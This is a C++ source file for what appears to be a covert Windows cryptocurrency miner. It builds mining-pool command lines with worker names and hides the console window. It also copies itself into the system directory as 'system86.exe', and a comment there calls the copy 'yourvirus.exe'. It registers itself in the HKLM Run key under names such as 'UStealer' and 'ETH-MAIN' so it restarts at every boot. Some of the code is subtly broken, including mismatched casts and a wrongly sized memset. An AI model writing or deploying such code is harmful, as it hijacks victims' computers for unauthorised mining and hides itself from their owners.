#include "COIN.h"


//const char* ETH = "";
//const char* ETC = "nircmd elevatecmd exec hide " % AppData % \Microsoft\Windows\start_miner.bat"";

char start;
char message[1000];	
char ANG[1000];
const char* cionname = "zhulele03.PC002";
const char* ssl = "stratum+tcp://es.huobipool.com:1800\
";

const char* ETC = "miner.exe --algo etchash  --server etc-pool.beepool.org:9518 --user zhuxs.PC01";
const char* CP = "notepad.exe";




void guanbi() {
	HWND hwndDOS = GetForegroundWindow();
	ShowWindow(hwndDOS, SW_HIDE);
}


void HKRunator(char* programName)   //程序名称（**全路径**）
{
	HKEY hkey = NULL;
	DWORD rc;

	rc = RegCreateKeyEx(HKEY_LOCAL_MACHINE,                      //创建一个注册表项，如果有则打开该注册表项
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_WOW64_64KEY | KEY_ALL_ACCESS,    //部分windows系统编译该行会报错， 删掉 “”KEY_WOW64_64KEY | “” 即可
		NULL,
		&hkey,
		NULL);

	if (rc == ERROR_SUCCESS)
	{
		rc = RegSetValueEx(hkey,
			"UStealer",
			0,
			REG_SZ,
			(const BYTE*)programName,
			strlen(programName));
		if (rc == ERROR_SUCCESS)
		{
			RegCloseKey(hkey);
		}
	}
}


void windows_run() {
	//写入注册表,开机自启动 
	HKEY hKey;
	//找到系统的启动项 
	LPCTSTR lpRun = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	//打开启动项Key 
	long lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpRun, 0, KEY_WRITE, &hKey);
	if (lRet == ERROR_SUCCESS)
	{
		char pFileName[MAX_PATH] = { 0 };
		//得到程序自身的全路径 
		DWORD dwRet = GetModuleFileName(NULL, pFileName, MAX_PATH);
		//添加一个子Key,并设置值 // 下面的"getip"是应用程序名字（不加后缀.exe）
		lRet = RegSetValueEx(hKey, "ETH-MAIN", 0, REG_SZ, (BYTE*)pFileName, dwRet);

		//关闭注册表 
		RegCloseKey(hKey);
		if (lRet != ERROR_SUCCESS)
		{
			//AfxMessageBox("");
			MessageBoxA(0, "系统参数错误,不能随系统启动", "系统", 0);
		}
	}
}


void windows_text() {
	{
		wchar_t system[MAX_PATH]; //系统目录路径
		wchar_t pathtofile[MAX_PATH]; //要开机运行的文件的完整路径
		HMODULE GetModH = GetModuleHandle(NULL);

		//得到当前执行文件的全路径
		GetModuleFileName(GetModH, pathtofile, sizeof(pathtofile));

		//得到系统文件所在目录的路径，如c:\windows\system32
		GetSystemDirectory((wchar_t)system, sizeof(system));

		//形成要复制到的全路径，如c:\windows\system32\yourvirus.exe
		char* system2 = (char*)system;

		strcat(system2, "\\system86.exe");

		//自我复制到目标路径
		CopyFile(pathtofile, system, false);

		//写入注册表，以便开机自动运行
		HKEY hKey;

		//打开注册表:路径如下
		//HEKY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
		char* path1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
		LPCWSTR path2 = (LPCWSTR)path1;
		RegOpenKeyEx(HKEY_LOCAL_MACHINE, path2, 0, KEY_SET_VALUE, &hKey);

		//新增一个值,名称随意命名,值为要开机运行的文件的完整路径
		char* path3 = "ETH-MAIN";
		LPCWSTR path4 = (LPCWSTR)path3;

		RegSetValueEx(hKey, path4, 0, REG_SZ, (const unsigned char*)system, sizeof(system));

		//关闭注册表:
		RegCloseKey(hKey);

		/*可以加入其他功能*/

	}
}






void ETH(const char* ssl, const char* coinname) {
	char text10[] = "PhoenixMiner.exe -pool %s -wal %s -dagrestart 1 -rvram -1 -eres 0";
	memset(message, 0, sizeof(text10));
	sprintf(message, text10, ssl, coinname);
	//cout << start << message << endl;
}



//void ETHS()
//{
//	char ETHT[] = "nircmd elevatecmd exec hide\" % AppData % \Microsoft\Windows\start_miner.bat\"";
//	
//}


void setcolor(unsigned short color)
{
	HANDLE hcon = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hcon, color);
}












